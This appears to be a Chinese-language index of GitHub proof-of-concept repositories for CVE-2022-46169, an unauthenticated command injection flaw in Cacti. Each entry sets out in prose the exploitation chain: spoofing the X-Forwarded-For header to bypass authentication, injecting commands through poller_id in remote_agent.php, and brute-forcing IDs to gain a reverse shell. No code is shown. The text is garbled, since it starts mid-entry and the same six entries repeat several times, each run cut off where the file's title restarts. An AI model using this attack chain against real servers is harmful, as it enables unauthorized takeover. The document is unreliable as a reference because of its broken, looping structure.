CVE-2022-46169 存在于 Cacti 1.2.22 及更早版本中，是一个未经身份验证的远程命令注入漏洞。攻击者可以通过伪造HTTP头绕过身份验证，然后通过操纵`poller_id`参数在`remote_agent.php`文件中执行任意命令。PoC代码通过Python脚本实现，利用此漏洞获取反向shell。该仓库的主要功能是提供漏洞利用代码，但由于开源软件的性质，任何人都可能修改并重新发布。**投毒风险较低 (5%)**，主要是因为该项目结构简单、代码量小，且功能单一，主要代码集中在cve_2022_46169/main.py中。需要人工审核确认没有恶意代码被隐藏。尽管存在风险，但考虑到代码的直接性和漏洞利用的明确性，以及利用反向shell的常见性，可以判断该代码的投毒可能性较低。

**利用方式：**
1.  攻击者首先需要确定目标Cacti服务器的版本低于或等于1.2.22。
2.  攻击者发送特制的HTTP请求到`remote_agent.php`，包含伪造的`Forwarded-For`头，绕过身份验证。
3.  攻击者构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，触发命令注入。
4.  如果目标服务器存在`POLLER_ACTION_SCRIPT_PHP`类型的`poller_item`配置，攻击者的命令将被执行。
5.  PoC代码利用此漏洞创建一个反向shell，允许攻击者远程控制目标服务器。

**项目地址:** [BKreisel/CVE-2022-46169](https://github.com/BKreisel/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #4

**来源**: [CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md](../2022/CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23且存在action类型为POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `remote_agent.php` 文件中的请求参数来执行任意操作系统命令。漏洞利用涉及以下步骤：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header 欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址，从而绕过身份验证检查。
2.  **`polldata` 操作触发：**  身份验证绕过后，攻击者可以调用 `remote_agent.php` 中的 `polldata` 操作。
3.  **命令注入：** 通过构造恶意的 `poller_id` 参数，将命令注入到传递给 `proc_open` 函数的字符串中，从而执行任意命令。
4.  **利用条件：** 成功利用需要存在一个 `poller_item`，其 `action` 字段值为 `POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id` 和 `local_data_ids` 可以通过暴力破解找到。

提供的POC代码 (`CVE-2022-46169.py`) 实现了上述攻击过程，包含以下步骤：

*   检查目标是否易受攻击 (`checkVuln` 函数)。
*   通过暴力破解查找有效的 `host_id` 和 `local_data_ids` (`bruteForcing` 函数)。
*   构造包含反向shell payload 的恶意请求，并将其发送到 `remote_agent.php` (`Reverse_shell` 函数)。

**关于投毒风险：**

对提供的POC代码进行分析，并未发现明显的恶意投毒代码，例如删除文件、上传恶意文件等行为。POC代码的主要功能是利用漏洞进行反向Shell连接。但依然存在一定的潜在风险：

*   **依赖风险：** 虽然代码本身看起来没有恶意，但它依赖于 `requests` 和 `urllib` 库。如果这些库本身被篡改，可能会引入风险。
*   **命令执行风险：**  该漏洞本身允许执行任意命令，攻击者可以利用这一点执行恶意操作。但这不属于代码投毒，而是漏洞的 inherent risk。

因此，将投毒风险评估为 5%。

**项目地址:** [FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #5

**来源**: [CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md](../2022/CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权远程代码执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标Cacti实例必须存在action类型为POLLER_ACTION_SCRIPT_PHP (2)的 poller_item配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的远程代码执行漏洞。该漏洞利用链包括身份验证绕过和命令注入两部分。

**利用方式：**

1.  **身份验证绕过：**  攻击者通过构造包含`Forwarded-For: <TARGETIP>`头的HTTP请求，其中`<TARGETIP>`为Cacti服务器的IP地址。`get_client_addr()` 函数会读取 `Forwarded-For` 头部，导致服务器错误地将攻击者识别为自身。因为Cacti默认会在poller表中添加自身hostname, 因此导致认证绕过。
2.  **命令注入：**  绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。该动作调用 `poll_for_data` 函数，该函数从请求参数中获取 `$poller_id`，此参数未经过滤直接拼接到 `proc_open` 函数的参数中，导致命令注入。攻击者需要提供一个`host_id`和`local_data_id`，并且对应poller_item的action必须是`POLLER_ACTION_SCRIPT_PHP`(值为2)才能触发命令注入.

**有效性：**

提供的POC代码（docker-compose.yaml）用于搭建存在漏洞的Cacti环境，方便漏洞分析和复现。漏洞原理描述清晰，利用方式明确。综合漏洞描述和搜索引擎结果，该漏洞利用的有效性高。

**投毒风险：**

虽然POC的主要目的是演示和分析漏洞，但存在一定的投毒风险。docker-compose.yaml 文件中使用了镜像 `smcline06/cacti`，如果该镜像被篡改，可能包含恶意代码。此外，提供的教程包含大量图片链接，这些链接如果指向恶意网站，也可能存在风险。综合考虑，评估投毒风险为10%。

**项目地址:** [HPT-Intern-Task-Submission/CVE-2022-46169](https://github.com/HPT-Intern-Task-Submission/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #6

**来源**: [CVE-2022-46169-Habib0x0_CVE-2022-46169.md](../2022/CVE-2022-46169-Habib0x0_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在满足条件的 poller_item (POLLER_ACTION_SCRIPT_PHP 类型), 且攻击者能够访问 remote_agent.php 页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并利用 `poller_id` 参数进行命令注入。 

**利用方式：**

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header，伪造客户端IP，绕过 `remote_agent.php` 的身份验证。
2.  **参数污染:** 攻击者利用`poller_id`，`host_id`，`local_data_ids[]`参数进行参数污染。
3.  **命令注入：** 成功绕过身份验证后，攻击者可以利用 `polldata` action，将恶意命令注入到 `poller_id` 参数中，从而执行任意系统命令。

**POC 分析：**

提供的 Ruby POC 代码首先尝试绕过身份验证，然后爆破`host_id`和`local_data_ids[]`，以找到有效的 `poller_item`，最后构造包含恶意命令的 URL，并发送 HTTP 请求触发命令注入。

**投毒风险分析：**

该 POC 代码主要功能是利用漏洞进行攻击。投毒风险较低，但仍然存在一定的潜在风险。
*   **依赖项风险：** POC 代码依赖于 `net/http`、`uri`、`json`、`optparse`、`artii` 和 `colorize` 等 Ruby 库。虽然这些库本身不太可能包含恶意代码，但始终存在依赖项被污染的风险。
*   **恶意命令注入：** 虽然 POC 中显示的命令是发起反向 Shell，但攻击者可以修改 POC 代码，注入其他恶意命令，例如删除文件、篡改数据等。因此，在使用 POC 时，务必仔细审查代码，确保不会执行未授权的操作。

综上，该 POC 的投毒风险相对较低，但仍需谨慎使用，并对代码进行充分审查。

**项目地址:** [Habib0x0/CVE-2022-46169](https://github.com/Habib0x0/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #7

**来源**: [CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md](../2022/CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md)

# CVE-2022-46169

> 📦 该CVE有 **31** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-46169-0xN7y_CVE-2022-46169.md](../2022/CVE-2022-46169-0xN7y_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例的URL，以及目标Cacti实例存在至少一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头`X-Forwarded-For`绕过身份验证，然后利用`polldata`动作触发命令注入。漏洞存在于`remote_agent.php`文件中，攻击者通过伪造客户端IP绕过认证，进而利用`poller_id`参数执行任意命令。提供的Python POC代码通过尝试不同的`host_id`和`poller_id`值，发送包含反向shell命令的恶意请求。 

**有效性：**
根据漏洞描述和POC代码，该漏洞利用是有效的，因为它可以允许未经身份验证的攻击者在受影响的Cacti实例上执行任意命令。

**投毒风险：**
该POC代码的投毒风险较低，约为5%。代码主要实现了漏洞利用，没有发现明显的恶意行为，如删除文件、上传恶意文件等。但是，任何漏洞利用代码都可能被修改为包含恶意功能，因此在使用前仍需谨慎审查。以下为可能的投毒点:

*   **反向shell地址：** 攻击者可能在不知情的情况下使用了被污染的反向shell监听地址，导致攻击暴露。
*   **命令注入payload：** 虽然当前payload是反向shell，但攻击者可能在不知情的情况下运行了其他有害命令。

**利用方式：**
1.  **身份验证绕过：** 通过设置`X-Forwarded-For` HTTP头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入：** 访问`remote_agent.php`，并设置`action`参数为`polldata`，`poller_id`参数为恶意命令。需要结合有效的`host_id`和`local_data_ids[]`，使得对应的`poller_item`的`action`为`POLLER_ACTION_SCRIPT_PHP`。
3.  **命令执行：** Cacti执行`proc_open`函数，将构造的恶意命令注入到shell中，实现远程代码执行。

**项目地址:** [0xN7y/CVE-2022-46169](https://github.com/0xN7y/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #2

**来源**: [CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md](../2022/CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`，且攻击者能够访问`remote_agent.php`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞，未经身份验证的攻击者可以通过精心构造的请求执行任意OS命令。该漏洞存在于`remote_agent.php`文件中，通过伪造 `X-Forwarded-For` 头绕过身份验证，然后通过 `polldata` 操作注入命令。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被积极利用。提供的PoC代码利用了身份验证绕过和命令注入漏洞，通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`，如果找到则执行反弹 shell 命令。  PoC的有效性较高。

**投毒风险：**
查看提供的PoC代码（`CVE-2022-46169.py`和`LICENSE`），主要功能是利用漏洞，没有发现明显的恶意代码或后门。`LICENSE` 文件是 GNU GPL v3 许可协议，属于开源协议。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 头部来伪造客户端IP地址，绕过 `remote_agent.php` 文件的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `polldata` 操作，并通过 `poller_id` 参数注入恶意命令。  PoC利用bash反弹shell。
3.  **参数爆破：** PoC代码通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。
4.  **执行任意命令：** 成功注入命令后，服务器将执行攻击者提供的命令。

**项目地址:** [0xZon/CVE-2022-46169-Exploit](https://github.com/0xZon/CVE-2022-46169-Exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #3

**来源**: [CVE-2022-46169-BKreisel_CVE-2022-46169.md](../2022/CVE-2022-46169-BKreisel_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** <= 1.2.22

**利用条件:** 需要Cacti服务器可访问，且存在action类型为POLLER_ACTION_SCRIPT_PHP（2）的poller_item配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.22 及更早版本中，是一个未经身份验证的远程命令注入漏洞。攻击者可以通过伪造HTTP头绕过身份验证，然后通过操纵`poller_id`参数在`remote_agent.php`文件中执行任意命令。PoC代码通过Python脚本实现，利用此漏洞获取反向shell。该仓库的主要功能是提供漏洞利用代码，但由于开源软件的性质，任何人都可能修改并重新发布。**投毒风险较低 (5%)**，主要是因为该项目结构简单、代码量小，且功能单一，主要代码集中在cve_2022_46169/main.py中。需要人工审核确认没有恶意代码被隐藏。尽管存在风险，但考虑到代码的直接性和漏洞利用的明确性，以及利用反向shell的常见性，可以判断该代码的投毒可能性较低。

**利用方式：**
1.  攻击者首先需要确定目标Cacti服务器的版本低于或等于1.2.22。
2.  攻击者发送特制的HTTP请求到`remote_agent.php`，包含伪造的`Forwarded-For`头，绕过身份验证。
3.  攻击者构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，触发命令注入。
4.  如果目标服务器存在`POLLER_ACTION_SCRIPT_PHP`类型的`poller_item`配置，攻击者的命令将被执行。
5.  PoC代码利用此漏洞创建一个反向shell，允许攻击者远程控制目标服务器。

**项目地址:** [BKreisel/CVE-2022-46169](https://github.com/BKreisel/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #4

**来源**: [CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md](../2022/CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23且存在action类型为POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `remote_agent.php` 文件中的请求参数来执行任意操作系统命令。漏洞利用涉及以下步骤：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header 欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址，从而绕过身份验证检查。
2.  **`polldata` 操作触发：**  身份验证绕过后，攻击者可以调用 `remote_agent.php` 中的 `polldata` 操作。
3.  **命令注入：** 通过构造恶意的 `poller_id` 参数，将命令注入到传递给 `proc_open` 函数的字符串中，从而执行任意命令。
4.  **利用条件：** 成功利用需要存在一个 `poller_item`，其 `action` 字段值为 `POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id` 和 `local_data_ids` 可以通过暴力破解找到。

提供的POC代码 (`CVE-2022-46169.py`) 实现了上述攻击过程，包含以下步骤：

*   检查目标是否易受攻击 (`checkVuln` 函数)。
*   通过暴力破解查找有效的 `host_id` 和 `local_data_ids` (`bruteForcing` 函数)。
*   构造包含反向shell payload 的恶意请求，并将其发送到 `remote_agent.php` (`Reverse_shell` 函数)。

**关于投毒风险：**

对提供的POC代码进行分析，并未发现明显的恶意投毒代码，例如删除文件、上传恶意文件等行为。POC代码的主要功能是利用漏洞进行反向Shell连接。但依然存在一定的潜在风险：

*   **依赖风险：** 虽然代码本身看起来没有恶意，但它依赖于 `requests` 和 `urllib` 库。如果这些库本身被篡改，可能会引入风险。
*   **命令执行风险：**  该漏洞本身允许执行任意命令，攻击者可以利用这一点执行恶意操作。但这不属于代码投毒，而是漏洞的 inherent risk。

因此，将投毒风险评估为 5%。

**项目地址:** [FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #5

**来源**: [CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md](../2022/CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权远程代码执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标Cacti实例必须存在action类型为POLLER_ACTION_SCRIPT_PHP (2)的 poller_item配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的远程代码执行漏洞。该漏洞利用链包括身份验证绕过和命令注入两部分。

**利用方式：**

1.  **身份验证绕过：**  攻击者通过构造包含`Forwarded-For: <TARGETIP>`头的HTTP请求，其中`<TARGETIP>`为Cacti服务器的IP地址。`get_client_addr()` 函数会读取 `Forwarded-For` 头部，导致服务器错误地将攻击者识别为自身。因为Cacti默认会在poller表中添加自身hostname, 因此导致认证绕过。
2.  **命令注入：**  绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。该动作调用 `poll_for_data` 函数，该函数从请求参数中获取 `$poller_id`，此参数未经过滤直接拼接到 `proc_open` 函数的参数中，导致命令注入。攻击者需要提供一个`host_id`和`local_data_id`，并且对应poller_item的action必须是`POLLER_ACTION_SCRIPT_PHP`(值为2)才能触发命令注入.

**有效性：**

提供的POC代码（docker-compose.yaml）用于搭建存在漏洞的Cacti环境，方便漏洞分析和复现。漏洞原理描述清晰，利用方式明确。综合漏洞描述和搜索引擎结果，该漏洞利用的有效性高。

**投毒风险：**

虽然POC的主要目的是演示和分析漏洞，但存在一定的投毒风险。docker-compose.yaml 文件中使用了镜像 `smcline06/cacti`，如果该镜像被篡改，可能包含恶意代码。此外，提供的教程包含大量图片链接，这些链接如果指向恶意网站，也可能存在风险。综合考虑，评估投毒风险为10%。

**项目地址:** [HPT-Intern-Task-Submission/CVE-2022-46169](https://github.com/HPT-Intern-Task-Submission/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #6

**来源**: [CVE-2022-46169-Habib0x0_CVE-2022-46169.md](../2022/CVE-2022-46169-Habib0x0_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在满足条件的 poller_item (POLLER_ACTION_SCRIPT_PHP 类型), 且攻击者能够访问 remote_agent.php 页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并利用 `poller_id` 参数进行命令注入。 

**利用方式：**

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header，伪造客户端IP，绕过 `remote_agent.php` 的身份验证。
2.  **参数污染:** 攻击者利用`poller_id`，`host_id`，`local_data_ids[]`参数进行参数污染。
3.  **命令注入：** 成功绕过身份验证后，攻击者可以利用 `polldata` action，将恶意命令注入到 `poller_id` 参数中，从而执行任意系统命令。

**POC 分析：**

提供的 Ruby POC 代码首先尝试绕过身份验证，然后爆破`host_id`和`local_data_ids[]`，以找到有效的 `poller_item`，最后构造包含恶意命令的 URL，并发送 HTTP 请求触发命令注入。

**投毒风险分析：**

该 POC 代码主要功能是利用漏洞进行攻击。投毒风险较低，但仍然存在一定的潜在风险。
*   **依赖项风险：** POC 代码依赖于 `net/http`、`uri`、`json`、`optparse`、`artii` 和 `colorize` 等 Ruby 库。虽然这些库本身不太可能包含恶意代码，但始终存在依赖项被污染的风险。
*   **恶意命令注入：** 虽然 POC 中显示的命令是发起反向 Shell，但攻击者可以修改 POC 代码，注入其他恶意命令，例如删除文件、篡改数据等。因此，在使用 POC 时，务必仔细审查代码，确保不会执行未授权的操作。

综上，该 POC 的投毒风险相对较低，但仍需谨慎使用，并对代码进行充分审查。

**项目地址:** [Habib0x0/CVE-2022-46169](https://github.com/Habib0x0/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #7

**来源**: [CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md](../2022/CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md)

# CVE-2022-46169

> 📦 该CVE有 **31** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-46169-0xN7y_CVE-2022-46169.md](../2022/CVE-2022-46169-0xN7y_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例的URL，以及目标Cacti实例存在至少一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头`X-Forwarded-For`绕过身份验证，然后利用`polldata`动作触发命令注入。漏洞存在于`remote_agent.php`文件中，攻击者通过伪造客户端IP绕过认证，进而利用`poller_id`参数执行任意命令。提供的Python POC代码通过尝试不同的`host_id`和`poller_id`值，发送包含反向shell命令的恶意请求。 

**有效性：**
根据漏洞描述和POC代码，该漏洞利用是有效的，因为它可以允许未经身份验证的攻击者在受影响的Cacti实例上执行任意命令。

**投毒风险：**
该POC代码的投毒风险较低，约为5%。代码主要实现了漏洞利用，没有发现明显的恶意行为，如删除文件、上传恶意文件等。但是，任何漏洞利用代码都可能被修改为包含恶意功能，因此在使用前仍需谨慎审查。以下为可能的投毒点:

*   **反向shell地址：** 攻击者可能在不知情的情况下使用了被污染的反向shell监听地址，导致攻击暴露。
*   **命令注入payload：** 虽然当前payload是反向shell，但攻击者可能在不知情的情况下运行了其他有害命令。

**利用方式：**
1.  **身份验证绕过：** 通过设置`X-Forwarded-For` HTTP头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入：** 访问`remote_agent.php`，并设置`action`参数为`polldata`，`poller_id`参数为恶意命令。需要结合有效的`host_id`和`local_data_ids[]`，使得对应的`poller_item`的`action`为`POLLER_ACTION_SCRIPT_PHP`。
3.  **命令执行：** Cacti执行`proc_open`函数，将构造的恶意命令注入到shell中，实现远程代码执行。

**项目地址:** [0xN7y/CVE-2022-46169](https://github.com/0xN7y/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #2

**来源**: [CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md](../2022/CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`，且攻击者能够访问`remote_agent.php`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞，未经身份验证的攻击者可以通过精心构造的请求执行任意OS命令。该漏洞存在于`remote_agent.php`文件中，通过伪造 `X-Forwarded-For` 头绕过身份验证，然后通过 `polldata` 操作注入命令。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被积极利用。提供的PoC代码利用了身份验证绕过和命令注入漏洞，通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`，如果找到则执行反弹 shell 命令。  PoC的有效性较高。

**投毒风险：**
查看提供的PoC代码（`CVE-2022-46169.py`和`LICENSE`），主要功能是利用漏洞，没有发现明显的恶意代码或后门。`LICENSE` 文件是 GNU GPL v3 许可协议，属于开源协议。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 头部来伪造客户端IP地址，绕过 `remote_agent.php` 文件的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `polldata` 操作，并通过 `poller_id` 参数注入恶意命令。  PoC利用bash反弹shell。
3.  **参数爆破：** PoC代码通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。
4.  **执行任意命令：** 成功注入命令后，服务器将执行攻击者提供的命令。

**项目地址:** [0xZon/CVE-2022-46169-Exploit](https://github.com/0xZon/CVE-2022-46169-Exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #3

**来源**: [CVE-2022-46169-BKreisel_CVE-2022-46169.md](../2022/CVE-2022-46169-BKreisel_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** <= 1.2.22

**利用条件:** 需要Cacti服务器可访问，且存在action类型为POLLER_ACTION_SCRIPT_PHP（2）的poller_item配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.22 及更早版本中，是一个未经身份验证的远程命令注入漏洞。攻击者可以通过伪造HTTP头绕过身份验证，然后通过操纵`poller_id`参数在`remote_agent.php`文件中执行任意命令。PoC代码通过Python脚本实现，利用此漏洞获取反向shell。该仓库的主要功能是提供漏洞利用代码，但由于开源软件的性质，任何人都可能修改并重新发布。**投毒风险较低 (5%)**，主要是因为该项目结构简单、代码量小，且功能单一，主要代码集中在cve_2022_46169/main.py中。需要人工审核确认没有恶意代码被隐藏。尽管存在风险，但考虑到代码的直接性和漏洞利用的明确性，以及利用反向shell的常见性，可以判断该代码的投毒可能性较低。

**利用方式：**
1.  攻击者首先需要确定目标Cacti服务器的版本低于或等于1.2.22。
2.  攻击者发送特制的HTTP请求到`remote_agent.php`，包含伪造的`Forwarded-For`头，绕过身份验证。
3.  攻击者构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，触发命令注入。
4.  如果目标服务器存在`POLLER_ACTION_SCRIPT_PHP`类型的`poller_item`配置，攻击者的命令将被执行。
5.  PoC代码利用此漏洞创建一个反向shell，允许攻击者远程控制目标服务器。

**项目地址:** [BKreisel/CVE-2022-46169](https://github.com/BKreisel/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #4

**来源**: [CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md](../2022/CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23且存在action类型为POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `remote_agent.php` 文件中的请求参数来执行任意操作系统命令。漏洞利用涉及以下步骤：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header 欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址，从而绕过身份验证检查。
2.  **`polldata` 操作触发：**  身份验证绕过后，攻击者可以调用 `remote_agent.php` 中的 `polldata` 操作。
3.  **命令注入：** 通过构造恶意的 `poller_id` 参数，将命令注入到传递给 `proc_open` 函数的字符串中，从而执行任意命令。
